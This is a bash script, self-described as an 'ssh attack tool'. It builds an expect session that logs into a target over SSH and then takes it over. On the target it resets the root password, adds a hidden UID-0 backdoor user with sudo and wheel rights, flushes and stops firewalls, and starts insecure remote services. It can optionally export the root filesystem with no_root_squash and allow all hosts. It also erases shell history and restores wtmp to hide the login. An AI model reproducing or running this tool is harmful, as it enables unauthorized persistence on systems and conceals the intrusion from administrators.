#!/usr/bin/env bash
#evil ssh; ssh attack tool
# TO DO
# drop all mysql stuff option
# deface website option
# mount remote share

if [ "$1" = "-h" -o "$1" = "--help" ]; then
	echo -e "\nUsage: $0 [user@host]|[user@host:port] [password] [options]"
	echo -e "\n	Example: $0 root@1.2.3.4 toor"
	echo -e "	Example: $0 root@1.2.3.4:2222 toor\n"
	echo -e "Invoking the script without any parameters will enter the script in manual configuration mode\n"
	echo "	-h, --help"
	echo -e "			Print this help information.\n"
	echo "	-B, --build-only"
	echo "			Specifying this option will only build the"
	echo "			script and not execute after building it. This can be"
	echo -e "			useful when preparing an expect script for later use.\n"
	echo "	-p, --port X"
	echo "			Allows user to specify which port SSH is running on"
	echo -e "			the target.\n"
	echo "	-P, --password <your_password_here>"
	echo "			Allows you to specify which password the backdoor"
	echo -e "			user will have on the remote target.\n"
	echo "	-r, --root-password"
	echo "			Allows you to specify the new root password on the"
	echo -e "			target.\n"
	echo "	-s,overwrite|append service1,service2"
	echo "			Allows you to specify which services are started on"
	echo "			the target. The overwrite option means you overwrite"
	echo "			the default services the script has configured. The"
	echo "			append option allows you to add to the services"
	echo -e "			already configured.\n"
	echo "	-S,overwrite|append service1,service2"
	echo "			Same as the -s option but this is for the services"
	echo -e "			to be stopped on the target.\n"
	echo "	-u, --userid X"
	echo "			This option allows you to specify what you want the"
	echo -e "			UID of backdoor user to be when added on the target.\n"
	exit 0
fi

location=`which expect`
if [ "$location" == "" ]; then
	echo "You do not have expect installed so this script will not run properly."
	echo -e "The expect script will be built but cannot be run successfully\nuntil you install expect."
fi

#variables - can be changed to meet different needs
expectFile="connect.exp"
errorFile=".evil_ssh.log"
serviceStop="iptables ipfw ipf pf"
serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs nfslock rpcbind rpcidmapd smb smbd samba rsync rsh rlogin"
doServices="yes"
newUser="sysd"
newUserID="0"
newRootPass="Password!"
newPass="Password!"
dropTables="no"
defaceSite="no"
shareRoot="no"
alterLastHistory="no"
buildOnly="no"

if [ $# -gt 0 ]; then
	firstArg=`echo $1 | /usr/bin/env awk -F":" '{print $1}'`
	port=`echo $1 | /usr/bin/env awk -F":" '{print $2}'`
	if [ ${#2} -lt 1 ]; then
		read -p "Enter password: " pass
	else
		pass=$2
	fi
	user=`echo $firstArg | /usr/bin/env awk -F"@" '{print $1}'`
	shift 2
else
	echo "Values can also be given as command line arguments."
	read -p "Enter host: " host
	read -p "Enter username: " user
	read -p "Enter password: " pass
	read -p "Enter port: " port
	firstArg="$user@$host"
fi

if [ ${#port} -lt 1 ]; then #if no port given, make default 22
		port=22
fi

echo "#!/usr/bin/expect" > $expectFile #write shebang to file

if [ "$alterLastHistory" == "yes" ]; then #if want to alter last history to cover tracks of logging in, write this to file
	/bin/cat <<SCP >> $expectFile
spawn scp -P $port $firstArg:/var/log/wtmp ./evil_ssh_wtmp_backup
expect yes/no { send yes\r; exp_continue}
expect "*assword*"
send "$pass\r"
expect "100%"
sleep 1
spawn scp -P $port ./evil_ssh_wtmp_backup $firstArg:/var/log/wtmp.bak
expect "*assword*"
send "$pass\r"
expect "100%"
sleep 1
SCP
fi

/bin/cat <<LOGIN >> $expectFile
spawn ssh -p $port $firstArg
expect yes/no { send yes\r; exp_continue}
set prompt ":|#|\\\\\\$"
interact -o -nobuffer -re \$prompt return
send "$pass\r"
LOGIN

if [ "$user" != "root" ]; then #if not root, sudo su to root and send password to be successful
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send \"history -d \`history | wc -l\`; sudo su\r\"" >> $expectFile
	echo "expect \"*assword*\" { send $pass\r; exp_continue}" >> $expectFile
fi

/bin/cat<<MORE >> $expectFile
interact -o -nobuffer -re \$prompt return
send "history -d \`history | wc -l\`; /bin/sh\r"
interact -o -nobuffer -re \$prompt return
send "echo -e '$newRootPass\\\n$newRootPass' | passwd root\r"
interact -o -nobuffer -re \$prompt return
send "useradd -g root -M -o -u $newUserID $newUser\r"
interact -o -nobuffer -re \$prompt return
send "usermod -a -G sudo $newUser\r"
interact -o -nobuffer -re \$prompt return
send "usermod -a -G wheel $newUser\r"
interact -o -nobuffer -re \$prompt return
send "usermod -a -G adm $newUser\r"
interact -o -nobuffer -re \$prompt return
send "pwck -s\r"
interact -o -nobuffer -re \$prompt return
send "echo -e '$newPass\\\n$newPass' | passwd $newUser\r"
interact -o -nobuffer -re \$prompt return
send "/usr/bin/env iptables -F || ipfw flush\r"
MORE

if [ "$dropTables" == "yes" ]; then
	echo "Dropping all MySQL tables functionality not yet implemented"
fi

if [ "$defaceSite" == "yes" ]; then
	echo "Defacing website functionality not yet implemented"
fi

#start certain services
if [ "$doServices" == "yes" ]; then
	for service in $serviceStart; do
		echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
		echo "send \"/usr/bin/env service $service start\r\" " >> $expectFile
	done

	#stop certain services
	for service in $serviceStop; do
		echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
		echo "send \"/usr/bin/env service $service stop\r\" " >> $expectFile
	done
fi

if [ "$shareRoot" == "yes" ]; then
	echo "Mounting remote share functionality not yet implemented"
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send \"echo \"/ *.*.*.*(rw,no_root_squash)\" >> /etc/exports\r\" " >> $expectFile
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send \"echo -e \"ALL:ALL\n\n\" >> /etc/hosts.allow\r\" " >> $expectFile
fi

if [ "$alterLastHistory" == "yes" ]; then
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send \"mv /var/log/wtmp.bak /var/log/wtmp\r\"" >> $expectFile
fi

/bin/cat <<BOTTOM >> $expectFile
interact -o -nobuffer -re \$prompt return
send "history -c; exit\r"
interact -o -nobuffer -re \$prompt return
send "history -d \`history | wc -l\`; exit\r"
interact -o -nobuffer -re \$prompt return
send "history -d \`history | wc -l\`; exit\r"
interact
BOTTOM

echo "Attempting login..."
if [ "$buildOnly" != "no" ]; then
	/usr/bin/expect myfile.exp
fi
echo "Completed."

